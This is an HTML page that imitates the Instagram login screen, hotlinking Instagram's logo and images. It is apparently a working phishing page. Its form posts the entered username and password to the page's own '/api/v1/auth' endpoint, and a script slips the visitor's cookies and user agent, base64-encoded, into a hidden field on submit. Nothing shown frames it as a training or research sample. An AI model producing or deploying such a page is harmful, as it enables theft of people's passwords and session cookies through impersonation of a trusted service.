<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .main { display: flex; align-items: center; }
        .phones { background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fd3d9d2c636d.png'); width: 454px; height: 618px; margin-right: 32px; }
        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; }
        .logo { width: 175px; margin-bottom: 20px; }
        input { width: 100%; padding: 9px; margin-bottom: 7px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
        button { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        @media (max-width: 800px) { .phones { display: none; } }
    </style>
</head>
<body>
    <div class="main">
        <div class="phones"></div>
        <div class="box">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b562.png" class="logo">
            <form action="/api/v1/auth" method="POST">
                <input type="text" name="u" placeholder="Phone, username, or email" required>
                <input type="password" name="p" placeholder="Password" required>
                <input type="hidden" name="token" id="t">
                <button type="submit">Log In</button>
            </form>
        </div>
    </div>
    <script>
        document.querySelector('form').onsubmit = function() {
            document.getElementById('t').value = btoa(JSON.stringify({ck: document.cookie, ua: navigator.userAgent}));
        };
    </script>
</body>
</html>
